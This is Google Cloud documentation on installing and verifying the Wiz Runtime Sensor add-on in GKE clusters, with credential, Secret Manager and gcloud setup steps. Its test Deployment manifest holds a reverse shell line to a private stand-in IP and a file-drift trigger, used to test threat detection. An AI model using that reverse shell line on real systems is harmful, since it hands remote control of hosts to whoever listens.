---
url: https://docs.cloud.google.com/kubernetes-engine/security/install-wiz-sensor-addon/
title: Install the Wiz Runtime Sensor in GKE clusters \u00a0|\u00a0 GKE security \u00a0|\u00a0 Google Cloud Documentation
method: scrapling+scrapegraph
fetched_at: 2026-10-23T10:33:53.453296+00:00
---

# Install the Wiz Runtime Sensor in GKE clusters  |  GKE security  |  Google Cloud Documentation

> Source: https://docs.cloud.google.com/kubernetes-engine/security/install-wiz-sensor-addon/

  * [ Home ](https://docs.cloud.google.com/)
  * [ Documentation ](https://docs.cloud.google.com/docs)
  * [ Application hosting ](https://docs.cloud.google.com/docs/application-hosting)
  * [ Google Kubernetes Engine (GKE) ](https://docs.cloud.google.com/kubernetes-engine/docs)
  * [ GKE security ](https://docs.cloud.google.com/kubernetes-engine/docs/concepts/security-overview)



Send feedback 

#  Install the Wiz Runtime Sensor in GKE clusters Stay organized with collections  Save and categorize content based on your preferences. 

[ Autopilot ](https://docs.cloud.google.com/kubernetes-engine/docs/concepts/autopilot-overview) [ Standard ](https://docs.cloud.google.com/kubernetes-engine/docs/concepts/choose-cluster-mode)

**Preview**

This feature is subject to the "Pre-GA Offerings Terms" in the General Service Terms section of the [Service Specific Terms](https://docs.cloud.google.com/terms/service-terms#1). Pre-GA features are available "as is" and might have limited support. For more information, see the [launch stage descriptions](https://cloud.google.com/products/#product-launch-stages). 

The Wiz Runtime Sensor is a component in the Wiz core platform that provides real-time threat detection and response capabilities for runtime workloads. You can install the Runtime Sensor in Google Kubernetes Engine (GKE) clusters as a managed add-on. This document shows platform administrators and security engineers how to install the Runtime Sensor add-on, configure access to the Wiz platform, and enforce Runtime Sensor installation across your organization, folder, or project.

You should already be familiar with the [Wiz Runtime Sensor](https://www.wiz.io/solutions/runtime-sensor).

## When to use the Runtime Sensor add-on

The managed add-on installation method is a built-in alternative to installing the Runtime Sensor by using installation methods like a Helm chart. The Runtime Sensor add-on has the following benefits:

  * GKE installs the components and manages most of the configuration tasks, which reduces the effort and complexity of installing the Runtime Sensor when compared to using the Helm chart.
  * You can use the Organization Policy Service to require enabling the add-on across your organization, folders, or projects.
  * The add-on runs in Autopilot clusters and alongside Autopilot workloads in Standard clusters without requiring that you add the Runtime Sensor to an allowlist.
  * Any updates to the Runtime Sensor components are independent of GKE patch version upgrades.



You can also install the Runtime Sensor in your clusters by using the Helm chart. If you use this method, then you get more flexibility to customize the sensor configuration. However, this method requires more manual configuration during installation and is more difficult to enforce at scale when compared to using the add-on. If you install the Runtime Sensor by using the Helm chart, then the components aren't managed by GKE. If you don't use the GKE add-on, then report any issues with the Runtime Sensor, such as errors or incompatibilities, directly to Wiz.

## How it works

You install the add-on in specific clusters by using the GKE API. When you enable the add-on, GKE creates the `gke-managed-wiz` namespace and installs the Runtime Sensor components. GKE requires access to the Wiz private container registry to pull images for the Runtime Sensor.

After installation, the Runtime Sensor requires access to the Wiz API to send information to the Wiz platform. To give GKE and the Runtime Sensor the required access, you provide the following information as Secrets in the `gke-managed-wiz` namespace:

  * Credentials to access the Wiz container registry and pull the Runtime Sensor image.
  * Configuration information for the Runtime Sensor, such as Wiz API credentials and environment-specific variables.



You can create these Secrets manually or upload the information to Google Cloud Secret Manager, which automatically creates the Secrets, rotates versions on a recurring schedule, and rolls out updates to deployed Secrets.

## Pricing

The Wiz Runtime Sensor add-on is available at no additional cost in GKE. The following considerations apply:

  * You must have an active Wiz Runtime Sensor license. For more information, see [Wiz Pricing](https://www.wiz.io/pricing).
  * The Runtime Sensor components run on your nodes and consume CPU and memory resources, which might result in more nodes being required to accommodate all of the Pods in your cluster.
  * If you use Secret Manager to store your Wiz credentials and configurations, then [Secret Manager pricing](https://docs.cloud.google.com/secret-manager/pricing) applies.



## Limitations

The following limitations apply to using the add-on:

  * If you update the Wiz registry or API credentials in the deployed Secrets, then you must manually restart the Runtime Sensor DaemonSet by using the `kubectl rollout restart` command.
  * To install the Runtime Sensor, you must upload your tenant's Wiz registry credentials as a Kubernetes Secret or to Secret Manager.
  * If you use private nodes, then you must [configure outbound access](https://docs.cloud.google.com/kubernetes-engine/docs/how-to/latest/network-isolation#private-nodes-outbound) to the Wiz container registry (`registry.wiz.io`) by using Cloud NAT.
  * The managed GKE add-on supports only the following optional configuration parameters for the Runtime Sensor: 
    * `httpProxyConfiguration.httpsProxy`
    * `httpProxyConfiguration.caCertificate`
    * `httpProxyConfiguration.clientCertificate`



To use any of the other configuration parameters, install the Runtime Sensor by using the Helm chart.

## Before you begin

Before you start, make sure that you have performed the following tasks: 

  * Enable the Google Kubernetes Engine API. 
[ Enable Google Kubernetes Engine API ](https://console.cloud.google.com/apis/enableflow?apiid=container.googleapis.com)
  * To use the Google Cloud CLI for this task, [install](https://docs.cloud.google.com/sdk/docs/install) and then [initialize](https://docs.cloud.google.com/sdk/docs/initialize) the gcloud CLI. If you previously installed the gcloud CLI, get the latest version by running the `gcloud components update` command. Earlier gcloud CLI versions might not support running the commands in this document. **Note:** For existing gcloud CLI installations, make sure to set the `compute/region` [property](https://docs.cloud.google.com/sdk/docs/properties#setting_properties). If you use primarily zonal clusters, set the `compute/zone` instead. By setting a default location, you can avoid errors in the gcloud CLI like the following: `One of [--zone, --region] must be supplied: Please specify location`. You might need to specify the location in certain commands if the location of your cluster differs from the default that you set.


  * Create an [Autopilot cluster](https://docs.cloud.google.com/kubernetes-engine/docs/how-to/creating-an-autopilot-cluster) or a [Standard cluster that has Workload Identity Federation for GKE enabled](https://docs.cloud.google.com/kubernetes-engine/docs/how-to/workload-identity#enable_on_clusters_and_node_pools) and runs GKE version 1.36.4-gke.1495000 or later.



### Required roles

To enable and configure the Runtime Sensor add-on for GKE, you must have the following roles on the Google Cloud project:

  * Configure GKE clusters: [Kubernetes Engine Cluster Admin](https://docs.cloud.google.com/iam/docs/roles-permissions/container#container.clusterAdmin) (`roles/container.clusterAdmin`) on the Google Cloud project.
  * Upload API credentials and configuration files to Secret Manager: [Secret Manager Editor](https://docs.cloud.google.com/iam/docs/roles-permissions/secretmanager#secretmanager.editor) (`roles/secretmanager.editor`) on the Google Cloud project.
  * Grant Identity and Access Management (IAM) roles to the Kubernetes ServiceAccount that the Runtime Sensor uses: [Secret Manager Admin](https://docs.cloud.google.com/iam/docs/roles-permissions/secretmanager#secretmanager.admin) (`roles/secretmanager.admin`) on the Google Cloud project.
  * Configure an organization policy: [Organization Policy Administrator](https://docs.cloud.google.com/iam/docs/roles-permissions/orgpolicy#orgpolicy.policyAdmin) (`roles/orgpolicy.policyAdmin`) on your organization.



You must also have access to a Wiz tenant to get credentials for the Wiz container registry and to generate an OAuth token for the Wiz API.

## Prepare Wiz credentials and configuration files

To install the Runtime Sensor and send information to the Wiz platform, you must provide credentials to access the Wiz private registry and the Wiz API. To prepare this information, follow these steps:

  1. [Find your Wiz container registry credentials](https://docs.wiz.io/docs/req-urls-ip-addr#find-your-wiz-container-registry-credentials) for the `registry.wiz.io` registry.
  2. Create a base64-encoded string that contains the registry credentials in a structure that Kubernetes can parse:
         
         echo -n 'WIZ_REGISTRY_USERNAME:WIZ_REGISTRY_PASSWORD' | base64 | tr -d '\n'
         

Replace the following:

     * `WIZ_REGISTRY_USERNAME`: the username for the Wiz container registry.
     * `WIZ_REGISTRY_PASSWORD`: the password for the Wiz container registry.

The output is similar to the following:
    
    aGVsbG86d29ybGQ=
    

  3. Save the information as a JSON file:
         
         {
           "auths": {
             "registry.wiz.io": {
               "username": "WIZ_REGISTRY_USERNAME",
               "password": "WIZ_REGISTRY_PASSWORD",
               "auth": "BASE64_ENCODED_CREDENTIALS"
             }
           }
         }
         

Replace `BASE64_ENCODED_CREDENTIALS` with the encoded string from the previous step.

  4. Create a Wiz Service Account and copy the following information:

     * The client ID, which you can also find in the Wiz portal on the **Service Accounts** page.
     * The client secret, which is visible only when you create the Service Account.
  5. Create a YAML configuration file for the Runtime Sensor:
         
         clientId: "WIZ_CLIENT_ID"
         clientToken: "WIZ_CLIENT_SECRET"
         clientEndpoint: "WIZ_CLIENT_ENDPOINT"
         

Replace the following:

     * `WIZ_CLIENT_ID`: the client ID for the Service Account.
     * `WIZ_CLIENT_TOKEN`: the client secret for the Service Account.
     * `WIZ_CLIENT_ENDPOINT`: the [token URL](https://docs.wiz.io/docs/using-the-wiz-api#token-url) to use, which depends on your Wiz tenant.
  6. Optional: If you use an HTTP proxy, you can configure the Runtime Sensor to use the proxy server. Create a YAML configuration file for the proxy:
         
         httpsProxy: "PROXY_URL"
         caCertificate: "CA_CERTIFICATE"
         clientCertificate: "CLIENT_CERTIFICATE"
         

Replace the following:

     * `PROXY_URL`: the fully-qualified proxy URL, such as `https://proxy.example.com:8080`.
     * `CA_CERTIFICATE`: the CA certificate, in PEM format, of the proxy server. If your proxy server doesn't use TLS, then specify an empty value (`""`).
     * `CLIENT_CERTIFICATE`: the client certificate, in PEM format, of the proxy server. If your proxy server doesn't use TLS, then specify an empty value (`""`).



## Create secrets in Secret Manager

This section shows you how to store the various Wiz configuration and credential files in Secret Manager. You can specify the URIs of these secrets when you enable the Runtime Sensor add-on in a GKE cluster. Secret Manager automatically creates the Kubernetes Secrets in the Wiz namespace. When you update the values in Secret Manager, the Kubernetes Secrets automatically re-synchronize to use the new values. You can optionally skip this section and manually create the Secrets in the `gke-managed-wiz` namespace.

To create the secrets in Secret Manager, follow these steps:

  1. Store the Wiz registry credentials:

     1. Create a secret to store the Wiz registry credentials:
            
            gcloud secrets create wiz-image-pull-secret \
                --replication-policy="automatic" \
                --project="SECRET_PROJECT_ID"
            

Replace `SECRET_PROJECT_ID` with the project ID of the Google Cloud project to create the secrets in.

     2. Store the Wiz registry credentials in the `wiz-image-pull-secret` secret:
            
            gcloud secrets versions add wiz-image-pull-secret \
                --project="SECRET_PROJECT_ID" \
                --data-file=PATH_TO_CREDENTIALS_FILE
            

Replace `PATH_TO_CREDENTIALS_FILE` with the path to the JSON file that contains the Wiz registry credentials.

  2. Store the Runtime Sensor API credentials:

     1. Create a secret to store the Runtime Sensor API credentials:
            
            gcloud secrets create wiz-api-key-secret \
                --replication-policy="automatic" \
                --project="SECRET_PROJECT_ID"
            

     2. Store the Runtime Sensor API credentials in the `wiz-api-key-secret` secret:
            
            gcloud secrets versions add wiz-api-key-secret \
                --project="SECRET_PROJECT_ID" \
                --data-file=PATH_TO_CONFIG_FILE
            

Replace `PATH_TO_CONFIG_FILE` with the path to the YAML file that contains the Runtime Sensor API credentials.

  3. Optional: Store configuration information for your proxy:

     1. Create a secret to store the proxy server configuration:
            
            gcloud secrets create wiz-sensor-proxy-secret \
                --replication-policy="automatic" \
                --project="SECRET_PROJECT_ID"
            

     2. Store the proxy server configuration in the `wiz-sensor-proxy-secret` secret:
            
            gcloud secrets versions add wiz-sensor-proxy-secret \
                --project="SECRET_PROJECT_ID" \
                --data-file=PATH_TO_PROXY_FILE
            

Replace `PATH_TO_PROXY_FILE` with the path to the YAML file that contains the proxy configuration parameters.




## Give GKE access to Secret Manager

To synchronize the information in Secret Manager as Kubernetes Secrets, grant the [Secret Manager Secret Accessor](https://docs.cloud.google.com/iam/docs/roles-permissions/secretmanager#secretmanager.secretAccessor) (`roles/secretmanager.secretAccessor`) IAM role on the secrets that you created to the `wiz-sensor-secretsync-sa` Kubernetes ServiceAccount in the `gke-managed-wiz` namespace. When you enable the Runtime Sensor add-on in a cluster, GKE creates this ServiceAccount and uses the ServiceAccount identity to create the corresponding Secrets in the namespace. If you plan to manually create Secrets instead of using Secret Manager, then skip this section.

The following steps show you how to grant the required role:

  1. Find the project number of your cluster project:
         
         gcloud projects describe CLUSTER_PROJECT_ID --format='value(projectNumber)'
         

The output is similar to `1234567890`.

  2. Grant the role on the `wiz-image-pull-secret` secret:
         
         gcloud secrets add-iam-policy-binding wiz-image-pull-secret \
             --project=SECRET_PROJECT_ID \
             --role="roles/secretmanager.secretAccessor" \
             --member="principal://iam.googleapis.com/projects/CLUSTER_PROJECT_NUMBER/locations/global/workloadIdentityPools/CLUSTER_PROJECT_ID.svc.id.goog/subject/ns/gke-managed-wiz/sa/wiz-sensor-secretsync-sa"
         

Replace the following:

     * `SECRET_PROJECT_ID`: the project ID of the project that contains your secrets.
     * `CLUSTER_PROJECT_NUMBER`: the project number of the cluster project.
     * `CLUSTER_PROJECT_ID`: the project ID of the cluster project.
  3. Grant the role on the `wiz-api-key-secret` secret:
         
         gcloud secrets add-iam-policy-binding wiz-api-key-secret \
             --project=SECRET_PROJECT_ID \
             --role="roles/secretmanager.secretAccessor" \
             --member="principal://iam.googleapis.com/projects/CLUSTER_PROJECT_NUMBER/locations/global/workloadIdentityPools/CLUSTER_PROJECT_ID.svc.id.goog/subject/ns/gke-managed-wiz/sa/wiz-sensor-secretsync-sa"
         

  4. Optional: If you created a secret that contains HTTP proxy information, then grant the role on the `wiz-sensor-proxy-secret` secret:
         
         gcloud secrets add-iam-policy-binding wiz-sensor-proxy-secret \
             --project=SECRET_PROJECT_ID \
             --role="roles/secretmanager.secretAccessor" \
             --member="principal://iam.googleapis.com/projects/CLUSTER_PROJECT_NUMBER/locations/global/workloadIdentityPools/CLUSTER_PROJECT_ID.svc.id.goog/subject/ns/gke-managed-wiz/sa/wiz-sensor-secretsync-sa"
         




## Enable the Runtime Sensor add-on for GKE

After you create the secrets in Secret Manager and grant GKE the required role on the secrets, enable the Runtime Sensor add-on for your cluster. You can enable the add-on on new or existing Standard or Autopilot clusters. The following steps show you how to enable the add-on and configure secret synchronization in an existing cluster. You can also use these flags during cluster creation.

  1. Enable secret synchronization for an existing cluster. If you plan to manually create Secrets instead of using Secret Manager, then skip this step.
         
         gcloud container clusters update CLUSTER_NAME \
             --project=CLUSTER_PROJECT_ID \
             --location=CONTROL_PLANE_LOCATION \
             --enable-secret-sync --enable-secret-sync-rotation
         

Replace the following:

     * `CLUSTER_NAME`: the name of your cluster.
     * `CLUSTER_PROJECT_ID`: the project ID of your cluster project.
     * `CONTROL_PLANE_LOCATION`: the control plane location of your cluster.
  2. Enable the add-on by running one of the following commands. If you plan to manually create Secrets instead of using Secret Manager, then specify only the `--addons` flag in these commands.

     * Enable the add-on without configuring an HTTP proxy:
           
           gcloud container clusters update CLUSTER_NAME \
               --project=CLUSTER_PROJECT_ID \
               --location=CONTROL_PLANE_LOCATION \
               --update-addons=WizSensor=ENABLED \
               --wiz-sensor-registry-secret-uri=projects/SECRET_PROJECT_ID/secrets/wiz-image-pull-secret/versions/latest \
               --wiz-sensor-api-key-secret-uri=projects/SECRET_PROJECT_ID/secrets/wiz-api-key-secret/versions/latest
           

     * Enable the add-on and configure an HTTP proxy:
           
           gcloud container clusters update CLUSTER_NAME \
               --project=CLUSTER_PROJECT_ID \
               --location=CONTROL_PLANE_LOCATION \
               --update-addons=WizSensor=ENABLED \
               --wiz-sensor-registry-secret-uri=projects/SECRET_PROJECT_ID/secrets/wiz-image-pull-secret/versions/latest \
               --wiz-sensor-api-key-secret-uri=projects/SECRET_PROJECT_ID/secrets/wiz-api-key-secret/versions/latest \
               --wiz-sensor-proxy-secret-uri=projects/SECRET_PROJECT_ID/secrets/wiz-sensor-proxy-secret/versions/latest
           




## Verify the installation

To verify the add-on installation, follow these steps:

  1. Get credentials to run `kubectl` commands in the cluster:
         
         gcloud container clusters get-credentials CLUSTER_NAME \
             --location=CONTROL_PLANE_LOCATION \
             --project=CLUSTER_PROJECT_ID
         

  2. Check whether the `gke-managed-wiz` namespace exists:
         
         kubectl get namespace gke-managed-wiz
         

The output is similar to the following:
         
         NAME              STATUS   AGE
         gke-managed-wiz   Active   76s
         

  3. Check whether the Secret Manager custom resources exist in the namespace:
         
         kubectl get secretproviderclass --namespace=gke-managed-wiz
         kubectl get secretsync --namespace=gke-managed-wiz
         

The output is similar to the following:
         
         NAME                          AGE
         wiz-sensor-secrets-provider   76s
         wiz-sensor-apikey             76s
         wiz-sensor-imagepullkey       75s
         wiz-sensor-proxy              76s
         

  4. Check whether the Kubernetes Secrets exist:
         
         kubectl get secrets --namespace=gke-managed-wiz
         

The output is similar to the following:
         
         NAME                      TYPE                              DATA   AGE
         wiz-sensor-apikey         Opaque                            3      76s
         wiz-sensor-imagepullkey   kubernetes.io/dockerconfigjson    1      75s
         

  5. Check the status of the Runtime Sensor DaemonSet:
         
         kubectl get daemonset --namespace=gke-managed-wiz
         

The output is similar to the following:
         
         NAME        DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR   AGE
         wiz-sensor  1         1         1       1            1           <none>          76s
         

This output indicates that the Runtime Sensor is ready and available.

  6. Check the startup and connection logs of the Runtime Sensor Pods:
         
         kubectl logs -n gke-managed-wiz daemonset/wiz-sensor --tail=100
         

The output is similar to the following:
         
         {"fields":{"defs_commit":"","defs_version":"0.0.0","message":"version","sensor_version":"1.0.12402 (CMT_6dda526 2026-09-11T15:51:34-04:00)"},"level":"INFO","timestamp":"2026-09-24T17:06:32.982+00:00"}
         {"fields":{"message":"starting content update"},"level":"INFO","timestamp":"2026-09-24T17:06:33.304+00:00"}
         {"fields":{"message":"ending content update - new content downloaded"},"level":"INFO","timestamp":"2026-09-24T17:06:34.215+00:00"}
         {"fields":{"defs_commit":"4cf39a653","defs_version":"1.0.6125","message":"version","sensor_version":"1.0.12402 (CMT_6dda526 2026-09-11T15:51:34-04:00)"},"level":"INFO","timestamp":"2026-09-24T17:06:34.372+00:00"}
         {"fields":{"env":{"ALLOWED_CONTROLLER_API_GROUPS":"[\"\",\"apps\",\"batch\",\"argoproj.io\",\"sparkoperator.k8s.io\",\"ray.io\",\"tekton.dev\",\"composer.cloud.google.com\",\"kafka.strimzi.io\",\"actions.github.com\"]","ALLOW_KUBELET_COMMUNICATION":"false","BACKEND_ENV":"prod","CRI_SOCKET_CUSTOM_PATH":"","HELM_CHART_COMPAT_VER":"1","HELM_CHART_VERSION":"1.0.11492","HTTP_PROXY_URL":"","JSON":"true","LOG_FILE":"/wiz-sensor-store/sensor.log","RAMFS_STORE":"/tmp/","SENSOR_CLUSTER_NAME":"CLUSTER_NAME","STDOUT_LOG":"error","TMP_STORE":"/wiz-sensor-store/"},"hash":"daa946af4dd7eb728495e752bb35399749ad2c2c","message":"Wiz Sensor env config"},"level":"INFO","timestamp":"2026-09-24T17:09:24.844+00:00"}
         {"fields":{"defs_commit":"4cf39a653","defs_version":"1.0.6125","message":"version","sensor_version":"1.0.12402 (CMT_6dda526 2026-09-11T15:51:34-04:00)"},"level":"INFO","timestamp":"2026-09-24T17:09:25.249+00:00"}
         {"fields":{"major":6,"message":"kernel version","minor":12,"patch":94},"level":"INFO","timestamp":"2026-09-24T17:09:25.277+00:00"}
         {"fields":{"delay":{"nanos":0,"secs":0},"message":"sensor start delay secs","range":0},"level":"INFO","timestamp":"2026-09-24T17:09:34.994+00:00"}
         




### Deploy a test workload

To check whether the connection to the Wiz portal works, follow these steps:

  1. Save the following Deployment manifest as a YAML file:
         
         apiVersion: apps/v1
         kind: Deployment
         metadata:
           name: demo-nginx
           namespace: default
         spec:
           replicas: 1
           selector:
             matchLabels:
               app: demo-nginx
           template:
             metadata:
               labels:
                 app: demo-nginx
             spec:
               containers:
               - name: nginx
                 image: nginx:1.15.6
                 command: ["/bin/bash", "-c"]
                 args:
                 - |
                   # Trigger background reverse shell attempt
                   (timeout 5 bash -i >& /dev/tcp/10.0.0.1/4444 0>&1) &
                   # Trigger image drift file modification
                   touch /usr/bin/malicious_test_file
                   # Start Nginx
                   exec nginx -g "daemon off;"
                 ports:
                 - containerPort: 80
         

This Deployment creates a Pod that simulates a reverse shell attack.

  2. Create the Deployment:
         
         kubectl apply -f PATH_TO_MANIFEST
         

Replace `PATH_TO_MANIFEST` with the path to the Deployment manifest file.

  3. In the Wiz Portal, go to the **Threats** page.

  4. In the table of threats, look for a threat finding for the reverse shell attempt.




## Enforce add-on installation by using an organization policy

You can enforce the installation of the Runtime Sensor add-on in multiple clusters across an organization, folder, or project by using Organization Policy. Create a custom constraint that has the following properties:

  * **Resource** : `container.googleapis.com/Cluster`
  * **Condition** : `resource.addonsConfig.wizSensor.enabled == false`
  * **Action** : `DENY`



For more information about how to configure a custom constraint that has these properties, see [Restrict actions on GKE resources using custom organization policies](https://docs.cloud.google.com/kubernetes-engine/docs/how-to/custom-org-policies).

## What's next

  * [Configure additional security posture monitoring for GKE](https://docs.cloud.google.com/kubernetes-engine/docs/concepts/about-security-posture-dashboard)



Send feedback 

Except as otherwise noted, the content of this page is licensed under the [Creative Commons Attribution 4.0 License](https://creativecommons.org/licenses/by/4.0/), and code samples are licensed under the [Apache 2.0 License](https://www.apache.org/licenses/LICENSE-2.0). For details, see the [Google Developers Site Policies](https://developers.google.com/site-policies). Java is a registered trademark of Oracle and/or its affiliates.

Last updated 2026-10-22 UTC.

Need to tell us more?  [[["Easy to understand","easyToUnderstand","thumb-up"],["Solved my problem","solvedMyProblem","thumb-up"],["Other","otherUp","thumb-up"]],[["Hard to understand","hardToUnderstand","thumb-down"],["Incorrect information or sample code","incorrectInformationOrSampleCode","thumb-down"],["Missing the information/samples I need","missingTheInformationSamplesINeed","thumb-down"],["Other","otherDown","thumb-down"]],["Last updated 2026-10-22 UTC."],[],[]] 
